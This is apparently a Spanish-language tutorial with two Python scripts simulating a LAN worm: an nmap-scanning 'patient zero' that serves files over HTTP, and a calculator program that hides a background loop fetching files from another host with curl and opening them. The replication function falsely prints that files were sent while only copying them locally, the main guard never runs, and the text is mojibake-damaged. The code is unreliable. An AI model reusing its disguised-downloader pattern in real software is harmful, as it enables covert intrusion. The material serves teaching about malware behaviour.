# 游놏 INTERACCION CON SISTEMAS LOCAL Y REMOTO - MALWARE -               P4Iciente\_WORMS\_0.py

PACIENTE 0 INFECTADA  CON SIMULACION DE MALWARE TIPO WORMS EL CUAL AFECTARA A OTROS PACIENTES DE SU RED LOCAL ESCANEANDO Y ENCONTRANDO PUERTAS ABIERTAS:

````python
// Some code

```python
#!SIMULACION DE PROGRAMA INFECTADO CON MALWARE GUSANO, EL CUAL ESCANEARA LOS PUERTOS Y LOGRARA UNA CONECCION POR UNO QUE ABRIO LA MAQUINA VICTIMA CON UNA APLICACION QUE PRESENTA OTRA VULNERABILIDAD HABRIENDO LA COMUNICACION POR SUS PUERTOS Y LOGRNDO ASI LA PROPAGACION DEL GUSANO EN OTRO DISPOSITIVO DE LA RED LOCAL
#! P4Iciente_WORMS_0.py - By P4IM0N

import subprocess  # Importa la librer칤a subprocess para ejecutar comandos en el sistema.
from tabulate import tabulate  # Importa la funci칩n tabulate para formatear los resultados en una tabla.
import os  # Importa la librer칤a os para trabajar con operaciones del sistema operativo.
import shutil  # Importa la librer칤a shutil para operaciones de archivo y directorio.
import pyautogui  # Importa la librer칤a pyautogui para automatizar acciones en la interfaz gr치fica.
import http.server  # Importa la librer칤a http.server para crear un servidor web.
import socketserver  # Importa la librer칤a socketserver para manejar conexiones de red.
import threading  # Importa la librer칤a threading para trabajar con hilos de ejecuci칩n paralela.


#------------------------------------------------------------
banner = '''

__________  _____ .___       .__               __             __      __________ __________    _____    _________   _______   
\______   \/  |  ||   | ____ |__| ____   _____/  |_  ____    /  \    /  \_____  \______   \  /     \  /   _____/   \   _  \  
 |     ___/   |  ||   |/ ___\|  |/ __ \ /    \   __\/ __ \   \   \/\/   //   |   \|       _/ /  \ /  \ \_____  \    /  /_\  \ 
 |    |  /    ^   /   \  \___|  \  ___/|   |  \  | \  ___/    \        //    |    \    |   \/    Y    \/        \   \  \_/   !
 |____|  \____   ||___|\___  >__|\___  >___|  /__|  \___  >____\__/\  / \_______  /____|_  /\____|__  /_______  /____\_____  /
              |__|         \/        \/     \/          \/_____/    \/          \/       \/         \/        \/_____/     \/ 
'''
print(banner)

#------------------------------------------------------------
# Define una funci칩n llamada iniciar_servidor que toma un argumento "puerto".
def iniciar_servidor(puerto):
    Handler = http.server.SimpleHTTPRequestHandler  # Define el manejador de peticiones para el servidor web.

    # Crea un servidor HTTP en el puerto especificado.
    with socketserver.TCPServer(("", puerto), Handler) as httpd:
        print(f"Sirviendo en el puerto {puerto}")  # Imprime un mensaje indicando en qu칠 puerto se est치 sirviendo.
        httpd.serve_forever()  # Inicia el servidor web y lo mantiene en ejecuci칩n indefinidamente.


#------------------------------------------------------------
# Define una funci칩n llamada escanear_puertos que toma un argumento "ip".
def escanear_puertos(ip):
    comando = f"nmap -Pn {ip}"  # Define un comando de escaneo de puertos usando la herramienta nmap.
    resultado = subprocess.getoutput(comando)  # Ejecuta el comando y obtiene la salida.

    puertos_abiertos = []  # Crea una lista para almacenar los puertos abiertos.
    for linea in resultado.splitlines():  # Itera sobre las l칤neas del resultado.
        if "/tcp" in linea and "open" in linea:  # Si la l칤nea contiene "/tcp" y "open":
            partes = linea.split()  # Divide la l칤nea en partes.
            puerto = int(partes[0].split("/")[0])  # Obtiene el n칰mero de puerto.
            puertos_abiertos.append(puerto)  # Agrega el puerto a la lista de puertos abiertos.

    return puertos_abiertos  # Devuelve la lista de puertos abiertos.


#------------------------------------------------------------
# Define una funci칩n llamada replicar_archivo que toma dos argumentos: "ip_objetivo" y "puerto_objetivo".
def replicar_archivo(ip_objetivo, puerto_objetivo):
    archivo_a_replicar = "gusano_0_0.txt"  # Define el nombre del archivo a replicar.

    try:  # Intenta realizar la siguiente operaci칩n:
        print(f"Conexi칩n exitosa al puerto {puerto_objetivo} en {ip_objetivo}")  # Imprime un mensaje de 칠xito.
        print(f"Archivo '{archivo_a_replicar}' enviado a trav칠s del puerto {puerto_objetivo}")  # Imprime informaci칩n sobre el archivo enviado.

        directorio_destino = os.path.dirname(os.path.abspath(__file__))  # Obtiene el directorio actual del script.
        numero_copias = 5  # Define el n칰mero de copias a crear.

        for i in range(numero_copias):  # Itera desde 0 hasta (numero_copias - 1).
            nombre_copia = f"{archivo_a_replicar[:-6]}_{i+1}.txt"  # Genera nombres de copia 칰nicos.
            shutil.copy(archivo_a_replicar, os.path.join(directorio_destino, nombre_copia))  # Copia el archivo a un nuevo nombre.

            if os.path.exists(nombre_copia):  # Si la copia del archivo existe:
                subprocess.run(["xdg-open", os.path.join(directorio_destino, nombre_copia)])  # Abre la copia del archivo.
                pyautogui.sleep(5)  # Espera durante 5 segundos.
                pyautogui.hotkey('alt', 'space')  # Activa la combinaci칩n de teclas 'Alt + Espacio'.
                pyautogui.press('x')  # Presiona la tecla 'x' para cerrar la ventana.

    except ConnectionRefusedError:  # Maneja una excepci칩n si no se puede conectar al puerto objetivo.
        print(f"No se pudo conectar al puerto {puerto_objetivo} en {ip_objetivo}")  # Imprime un mensaje de error.

#------------------------------------------------------------
# Define una funci칩n llamada mostrar_resultados que toma un argumento "resultados".
def mostrar_resultados(resultados):
    print('//////////////EL INTENTO INGRESAR POR LOS PUERTOS ABIERTOS QUE SE ESCANEARON //////////////')
    headers = ["IP", "Puerto"]  # Define las cabeceras de la tabla.
    print(tabulate(resultados, headers=headers, tablefmt="grid"))  # Imprime los resultados en formato de tabla.

#------------------------------------------------------------
ip_objetivo = "192.168.0.20"  # Define la IP objetivo.

#------------------------------------------------------------
# Crea un nuevo hilo para ejecutar la funci칩n iniciar_servidor en segundo plano.
thread_servidor = threading.Thread(target=iniciar_servidor, args=(80,))
thread_servidor.start()

#------------------------------------------------------------
# Escanea los puertos abiertos en la IP objetivo y almacena los resultados.
puertos_abiertos = escanear_puertos(ip_objetivo)

# Replica el archivo en cada puerto abierto.
for puerto in puertos_abiertos:
    replicar_archivo(ip_objetivo, puerto)

# Muestra los resultados en una tabla.
mostrar_resultados([(ip_objetivo, puerto) for puerto in puertos_abiertos])
#------------------------------------------------------------


```
````

PACIENTE 1 (CALCULADORA INFECTADA) EL CUAL SIMULA TENER UN TROYANO PROBOCANDO UN BACKDOORS POR LO QUE ES PROPAGADO EL MALWARE DE TIPO GUSANO WORMS EN ELLA PROVENIENTE DEL PACIENTE 0 INFECTADO:

````python
// Some code

```python
#!PROGRAMA DE CALCULADORA LA CUAL TIENE UN FALLO DE VULNERABILIDAD LA CUAL SOLICTA ATRAVES DE SU PUERTO DESCARGAS DE ARCHIVO DE OTRA PC EN SU MISMAA RED
#! calculadoraConVULNERAVILIDAD.PY -  bY P4IM0N

import subprocess  # Importa la librer칤a subprocess para ejecutar comandos en el sistema.
import time  # Importa la librer칤a time para trabajar con el tiempo.
import os  # Importa la librer칤a os para trabajar con operaciones del sistema operativo.
import socket  # Importa el m칩dulo socket para obtener la informaci칩n del puerto local.

# Define una funci칩n llamada abrir_calculadora sin argumentos.
def abrir_calculadora():
    # Abre la calculadora en primer plano usando la herramienta "calc.exe".
    subprocess.Popen("calc.exe", shell=True)

# Define una funci칩n llamada descargar_archivos que toma dos argumentos: "direccion_ip" y "puerto".
def descargar_archivos(direccion_ip, puerto):
    while True:  # Inicia un bucle infinito.
        for i in range(5):  # Itera desde 0 hasta 4.
            time.sleep(4)  # Espera durante 4 segundos.

            # Crea un nombre de archivo 칰nico con el valor de "i".
            nombre_archivo = f"gusano_0_{i}.txt"

            # Obt칠n el n칰mero de puerto local.
            puerto_local = obtener_puerto_local()

            # Imprime el puerto local por el que est치 llegando la descarga.
            print(f"Descargando archivo a trav칠s del puerto local {puerto_local}")

            # Construye un comando de descarga usando "curl" y el nombre de archivo.
            comando = f"curl http://{direccion_ip}:{puerto}/gusano_0_{i}.txt -O {nombre_archivo} "
            
            # Ejecuta el comando de descarga en segundo plano.
            subprocess.Popen(comando, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Cuando "i" llega a 4, abre el 칰ltimo archivo en primer plano.
            if i == 3:
                os.system(f"start {nombre_archivo}")  # Abre el archivo en primer plano.

# Funci칩n para obtener el n칰mero de puerto local.
def obtener_puerto_local():
    # Crea un objeto de socket usando IPv4 (AF_INET) y TCP (SOCK_STREAM).
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Vincula el socket a la direcci칩n 'localhost' (127.0.0.1) y un puerto ef칤mero asignado autom치ticamente (0).
    # Cuando se usa 0 como el n칰mero de puerto, el sistema operativo elige un puerto disponible autom치ticamente.
    sock.bind(('localhost', 0))
    
    # Obtiene la informaci칩n del socket, incluyendo la direcci칩n IP y el n칰mero de puerto local.
    _, puerto_local = sock.getsockname()
    
    # Cierra el socket despu칠s de obtener la informaci칩n.
    sock.close()
    
    # Devuelve el n칰mero de puerto local que fue asignado autom치ticamente por el sistema operativo.
    return puerto_local

if __name__ == "main":
    # Entra en esta secci칩n cuando se ejecuta el script directamente (no cuando se importa como m칩dulo).

    # Llama a la funci칩n "abrir_calculadora" para abrir la calculadora en primer plano.
    abrir_calculadora()

    # Llama a la funci칩n "descargar_archivos" para descargar archivos en segundo plano.
    descargar_archivos('192.168.0.18', 80)


```
````
